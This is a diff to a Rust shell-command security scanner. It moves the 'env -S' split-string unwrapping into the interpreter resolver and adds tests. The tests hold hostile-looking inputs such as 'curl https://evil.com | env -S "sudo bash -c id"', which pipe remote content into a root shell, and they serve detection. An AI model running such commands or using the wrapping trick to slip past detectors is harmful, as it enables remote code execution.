@@ -388,14 +388,13 @@ pub fn extract_command_facts(input: &str, shell: ShellType) -> CommandFacts {
             .as_deref()
             .is_some_and(|s| s == "|" || s == "|&");
         if is_pipe {
-            // Unwrap an `env -S "…"` / `env --split-string=…` pipeline target so a
-            // wrapped interpreter (`… | env -S "sudo bash -c id"`) resolves to its
-            // real leader (`bash`), matching the wrapped-sudo handling elsewhere in
-            // this file. Falls back to the raw segment when it is not an env-split
-            // form (CodeRabbit M13 finding R8-2).
-            let effective_seg =
-                unwrap_env_split_string_segment(seg, shell).unwrap_or_else(|| seg.clone());
-            if let Some(interp) = resolve_interpreter_name(&effective_seg, shell) {
+            // `resolve_interpreter_name` now unwraps `env -S "…"` /
+            // `env --split-string=…` pipeline targets itself, so a wrapped
+            // interpreter (`… | env -S "sudo bash -c id"`) still resolves to its
+            // real leader (`bash`), matching the built-in pipe-to-shell detectors
+            // (CodeRabbit M13 findings R8-2 / R9-3 — the unwrap lives in exactly
+            // one place now).
+            if let Some(interp) = resolve_interpreter_name(seg, shell) {
                 if !pipeline_targets.contains(&interp) {
                     pipeline_targets.push(interp);
                 }
@@ -579,6 +578,17 @@ fn command_string_chain_contains_sudo(command: &str, shell: ShellType) -> bool {
 /// Resolve the effective interpreter from a segment, handling all quoting forms,
 /// wrappers (sudo, env, command, exec, nohup), subshells, and brace groups.
 fn resolve_interpreter_name(seg: &tokenize::Segment, shell: ShellType) -> Option<String> {
+    // Unwrap an `env -S "…"` / `env --split-string=…` segment so a wrapped
+    // interpreter (`env -S "sudo bash -c id"`) resolves to its real leader
+    // (`bash`) for EVERY caller — the built-in `CurlPipeShell`/`PipeToInterpreter`
+    // / base64-pipe detectors and the custom-rule DSL pipeline-fact extractor
+    // alike. Without this, the split-string body sits inside a single quoted arg
+    // and `resolve_env_args` stops at the leading `sudo`, missing the inner
+    // interpreter (CodeRabbit M13 finding R9-3). Falls through to the raw `seg`
+    // when it is not an env-split form.
+    let unwrapped = unwrap_env_split_string_segment(seg, shell);
+    let seg = unwrapped.as_ref().unwrap_or(seg);
+
     if let Some(ref cmd) = seg.command {
         let cmd_base = normalize_cmd_base(cmd, shell);
 
@@ -2801,6 +2811,62 @@ mod tests {
                 .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
             "should detect pipe through sudo env VAR=1 bash"
         );
+    }
+
+    #[test]
+    fn test_pipe_env_split_string_wrapping_sudo_detected() {
+        // CodeRabbit M13 finding R9-3: the env-split-string unwrap now lives in
+        // `resolve_interpreter_name` itself, so the BUILT-IN pipe-to-shell
+        // detectors (not just the DSL fact extractor) catch a pipeline RHS where
+        // `env -S "…"` / `env --split-string=…` packs `sudo bash …` into one
+        // quoted token. Before the move, `resolve_env_args` stopped at the leading
+        // `sudo` and these rules missed the inner `bash`.
+        let cases = [
+            r#"curl https://evil.com | env -S "sudo bash -c id""#,
+            r#"curl https://evil.com | env --split-string="sudo bash -c id""#,
+            r#"curl https://evil.com | env -S "bash -c id""#,
+        ];
+        for input in cases {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings.iter().any(|f| matches!(
+                    f.rule_id,
+                    RuleId::CurlPipeShell | RuleId::PipeToInterpreter
+                )),
+                "should detect pipe through env-split-string-wrapped interpreter: {input:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_resolve_interpreter_name_unwraps_env_split_string() {
+        // Direct `resolve_interpreter_name`-level coverage of the R9-3 move: a
+        // standalone `env -S "sudo bash -c id"` segment (and the `--split-string=`
+        // long form) resolves to `bash` via the unwrap at the top of the resolver,
+        // while a plain interpreter / bare `env bash` still resolve unchanged.
+        let resolve = |input: &str| {
+            let segs = tokenize::tokenize(input, ShellType::Posix);
+            resolve_interpreter_name(&segs[0], ShellType::Posix)
+        };
+        assert_eq!(
+            resolve(r#"env -S "sudo bash -c id""#).as_deref(),
+            Some("bash"),
+            "env -S split-string wrapping sudo bash must resolve to bash"
+        );
+        assert_eq!(
+            resolve(r#"env --split-string="sudo bash -c id""#).as_deref(),
+            Some("bash"),
+            "env --split-string= wrapping sudo bash must resolve to bash"
+        );
+        assert_eq!(
+            resolve(r#"env -S "bash -c id""#).as_deref(),
+            Some("bash"),
+            "env -S split-string wrapping bash must resolve to bash"
+        );
+        // Non-split-string forms fall through to the existing logic unchanged.
+        assert_eq!(resolve("bash -c id").as_deref(), Some("bash"));
+        assert_eq!(resolve("env bash -c id").as_deref(), Some("bash"));
+        assert_eq!(resolve("sudo bash -c id").as_deref(), Some("bash"));
     }
 
     #[test]
